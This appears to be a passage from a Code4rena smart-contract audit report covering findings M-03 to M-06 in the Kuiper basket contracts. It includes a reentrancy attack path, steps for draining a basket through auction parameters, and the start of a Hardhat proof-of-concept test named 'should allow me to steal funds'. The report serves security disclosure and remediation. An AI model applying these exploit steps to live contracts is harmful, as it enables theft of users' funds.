id=\"m-03-basketsolauctionburn-calculates-ibratio-wrong\" style=\"position:relative;\"><a href=\"#m-03-basketsolauctionburn-calculates-ibratio-wrong\" aria-label=\"m 03 basketsolauctionburn calculates ibratio wrong permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/144\">[M-03] <code>Basket.sol#auctionBurn</code> calculates <code>ibRatio</code> wrong</a></h2>\n<p><em>Submitted by 0x0x0x</em></p>\n<p>The function is implemented as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function auctionBurn(uint256 amount) onlyAuction nonReentrant external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 startSupply = totalSupply();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        handleFees(startSupply);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _burn(msg.sender, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 newIbRatio = ibRatio * startSupply / (startSupply - amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ibRatio = newIbRatio;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit NewIBRatio(newIbRatio);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Burned(msg.sender, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>When <code>handleFees</code> is called, <code>totalSupply</code> and <code>ibRatio</code> changes accordingly, but for <code>newIbRatio</code> calculation tokens minted in <code>handleFees</code> is not included. Therefore, <code>ibRatio</code> is calculated higher than it should be. This is dangerous, since last withdrawing user(s) lose their funds with this operation. In case this miscalculation happens more than once, <code>newIbRatio</code> will increase the miscalculation even faster and can result in serious amount of funds missing. At each time <code>auctionBurn</code> is called, at least 1 day (auction duration) of fees result in this miscalculation. Furthermore, all critical logic of this contract is based on <code>ibRatio</code>, this behaviour can create serious miscalculations.</p>\n<h3 id=\"mitigation-step\" style=\"position:relative;\"><a href=\"#mitigation-step\" aria-label=\"mitigation step permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation step</h3>\n<p>Rather than</p>\n<p><code>uint256 newIbRatio = ibRatio * startSupply / (startSupply - amount);</code></p>\n<p>A practical solution to this problem is calculating <code>newIbRatio</code> as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 supply = totalSupply();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 newIbRatio = ibRatio * (supply + amount) / supply;</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/144\">frank-beard (Kuiper) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/144#issuecomment-1079628195\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has identified an issue whereby <code>newIbRatio</code> uses an incorrect <code>startSupply</code> variable which is under-represented. As new tokens may be minted in <code>handleFees()</code>, this will lead to an incorrect <code>ibRatio</code> which is used in all other areas of the protocol. A lower <code>ibRatio</code> causes <code>pushUnderlying()</code> and <code>pullUnderlying()</code> to be improperly accounted for. As a result, burning basket tokens will redeem a smaller amount of underlying tokens and minting basket tokens will require a smaller amount of underlying tokens.</p>\n<p>This causes the protocol to leak value from all basket token holders but it does not allow assets to be stolen. As such, I think this is better put as a <code>medium</code> severity issue.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-reentrancy-vulnerability-in-basket-contracts-initialize-method\" style=\"position:relative;\"><a href=\"#m-04-reentrancy-vulnerability-in-basket-contracts-initialize-method\" aria-label=\"m 04 reentrancy vulnerability in basket contracts initialize method permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/176\">[M-04] Reentrancy vulnerability in <code>Basket</code> contract’s <code>initialize()</code> method.</a></h2>\n<p><em>Submitted by broccolirob</em></p>\n<p>A malicious “publisher” can create a basket proposal that mixes real ERC20 tokens with a malicious ERC20 token containing a reentrancy callback in it’s <code>approve()</code> method. When the <code>initialize()</code> method is called on the newly cloned <code>Basket</code> contract, a method called <code>approveUnderlying(address(auction))</code> is called, which would trigger the reentrancy, call <code>initialize()</code> again, passing in altered critical values such as <code>auction</code> and <code>factory</code>, and then removes its self from <code>proposal.tokens</code> and <code>proposal.weights</code> so it doesn’t appear in the token list to basket users.</p>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L44-L61\">Basket.sol#L44-L61</a></p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p><code>Auction</code> and <code>Factory</code> can be set to custom implementations that do malicious things. Since all baskets and auctions are clones with their own addresses, this fact would be difficult for users to detect. <code>Auction</code> controls ibRatio, which a malicious version could send back a manipulated value to <code>Basket</code>, allowing the malicious “publisher” to burn basket tokens till all users underlying tokens are drained.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual review and Hardhat.</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Since <code>Basket</code> inherits from <code>ERC20Upgradeable</code> the <code>initializer</code> modifier should be available and therefore used here. It has an <code>inititializing</code> variable that would prevent this kind of reentrancy attack.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/176\">frank-beard (Kuiper) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/176#issuecomment-1079636401\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>While the warden is correct, a malicious publisher could re-enter the <code>Basket.initialize()</code> function and overwrite <code>factory</code> and <code>auction</code> with their own addresses, this does not lead to a direct loss of funds for users. It would require that users interact with their malicious contracts which is entirely possible if baskets created via the factory are deemed as trusted. I think this fits the criteria of a <code>medium</code> severity issue.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-change-in-auctionmultiplierauctiondecrement-change-profitability-of-auctions-and-factory-can-steal-all-tokens-from-a-basket-abusing-it\" style=\"position:relative;\"><a href=\"#m-05-change-in-auctionmultiplierauctiondecrement-change-profitability-of-auctions-and-factory-can-steal-all-tokens-from-a-basket-abusing-it\" aria-label=\"m 05 change in auctionmultiplierauctiondecrement change profitability of auctions and factory can steal all tokens from a basket abusing it permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/145\">[M-05] Change in <code>auctionMultiplier/auctionDecrement</code> change profitability of auctions and factory can steal all tokens from a basket abusing it</a></h2>\n<p><em>Submitted by 0x0x0x</em></p>\n<p>When factory changes <code>auctionMultiplier</code> or <code>auctionDecrement</code> profitability of bonded auctions change. There is no protection against this behaviour. Furthermore, factory owners can decide to get all tokens from baskets where they are bonded for the auction.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of concept</h3>\n<p>1- Factory owners call <code>bondForRebalance</code> for an auction.</p>\n<p>2- Factory owners sets <code>auctionMultiplier</code> as 0 and <code>auctionDecrement</code> as maximum value</p>\n<p>3- <code>settleAuction</code> is called. <code>newRatio = 0</code>, since <code>a = b = 0</code>. All tokens can be withdrawn with this call, since <code>tokensNeeded = 0</code>.</p>\n<h3 id=\"extra-notes\" style=\"position:relative;\"><a href=\"#extra-notes\" aria-label=\"extra notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Extra notes</h3>\n<p>Furthermore, even the factory owners does not try to scam users. In case <code>auctionMultiplier</code> or <code>auctionDecrement</code> is changed, all current <code>auctionBonder</code> from <code>Auctions</code> can only call <code>settleAuction</code> with different constraints. Because of different constraints, users/bonder will lose/gain funds.</p>\n<h3 id=\"mitigation-step-1\" style=\"position:relative;\"><a href=\"#mitigation-step-1\" aria-label=\"mitigation step 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation step</h3>\n<p>Save <code>auctionDecrement</code> and <code>auctionMultiplier</code> to global variables in <code>Auction.sol</code>, when <code>startAuction</code> is called.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/145#issuecomment-1049059976\">frank-beard (Kuiper) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Adding in protection from the global governance is definitely important.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/145#issuecomment-1079812584\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has identified an issue whereby the factory owner can rug-pull baskets through the re-balancing mechanism. Because <code>newRatio = 0</code>, the basket improperly checks the tokens needed in the contract. However, this assumes that the factory owner is malicious which satisfies <code>medium</code> severity due to assets not being at direct risk.</p>\n<p>The sponsor has decided to add additional protections (potentially via timelock) to mitigate this issue.</p>\n<p>This rug-pull is made even more difficult by the fact that <code>newRatio</code> must be <code>>= minIbRatio</code>. Because <code>minIbRatio</code> is behind timelock, I think this rug vector is unlikely or at least can only be used to steal a fixed amount of funds.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-basket-can-be-fully-drained-if-the-auction-is-settled-within-a-specific-block\" style=\"position:relative;\"><a href=\"#m-06-basket-can-be-fully-drained-if-the-auction-is-settled-within-a-specific-block\" aria-label=\"m 06 basket can be fully drained if the auction is settled within a specific block permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/74\">[M-06] Basket can be fully drained if the auction is settled within a specific block</a></h2>\n<p><em>Submitted by Ruhum</em></p>\n<p>The <code>settleAuction()</code> function allows someone to settle the auction by transferring funds in a way that the new pending index is fulfilled. As a reward, they are able to take out as many tokens as they want as long as the pending index is fulfilled after that. The function verifies that the basket has received everything it wanted using the following logic:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">pendingWeights</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensNeeded</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">basketAsERC20</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">pendingWeights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] * </span><span class=\"mtk12\">newRatio</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pendingTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">basket</span><span class=\"mtk1\">)) &gt;= </span><span class=\"mtk12\">tokensNeeded</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The attack vector here is to manipulate <code>tokensNeeded</code> to be 0. That way we can drain the basket completely without the function reverting.</p>\n<p>For that, we manipulate <code>newRatio</code> to be 0 then the whole thing will be 0.\n<code>newRatio</code> is defined as:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionMultiplier</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ibRatio</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">b</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">bondBlock</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">auctionStart</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionDecrement</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">b</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>There’s 1 value the attacker controls, <code>bondBlock</code>. That value is the block in which the <code>bondForRebalance()</code> function was triggered.\nSo the goal is to get <code>newRatio</code> to be 0. With the base settings of the contract:</p>\n<ul>\n<li>auctionMultiplier == 2</li>\n<li>ibRatio == 1e18</li>\n<li>BASE == 1e18</li>\n<li>auctionDecrement == 10000</li>\n</ul>\n<p><code>bondBlock</code> has to be <code>auctionStart + 20000</code>. Meaning, the <code>bondForRebalance()</code> function has to be triggered exactly 20000 blocks after the action was started. That would be around 3 1/2 days after auction start.</p>\n<p>At that point, <code>newRatio</code> is 0, and thus <code>tokensNeeded</code> is 0. The only thing left to do is to call <code>settleAuction()</code> and pass the basket’s tokens and balance as the output tokens and weight.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here’s a test implementing the above scenario as a test. You can add it to <code>Auction.test.js</code>.:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;should allow me to steal funds&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\">() </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// start an auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NEW_UNI_WEIGHT</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;2400000000000000000&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NEW_COMP_WEIGHT</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;2000000000000000000&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NEW_AAVE_WEIGHT</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;400000000000000000&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk11\">publishNewIndex</span><span class=\"mtk1\">([</span><span class=\"mtk12\">UNI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">COMP</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">AAVE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">], </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            [</span><span class=\"mtk12\">NEW_UNI_WEIGHT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">NEW_COMP_WEIGHT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">NEW_AAVE_WEIGHT</span><span class=\"mtk1\">], </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ok</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">increaseTime</span><span class=\"mtk1\">(</span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">24</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">increaseTime</span><span class=\"mtk1\">(</span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">24</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk11\">publishNewIndex</span><span class=\"mtk1\">([</span><span class=\"mtk12\">UNI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">COMP</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">AAVE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">], </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          [</span><span class=\"mtk12\">NEW_UNI_WEIGHT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">NEW_COMP_WEIGHT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">NEW_AAVE_WEIGHT</span><span class=\"mtk1\">], </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ok</span><span class=\"mtk1\">;</span></span></span>\n<span 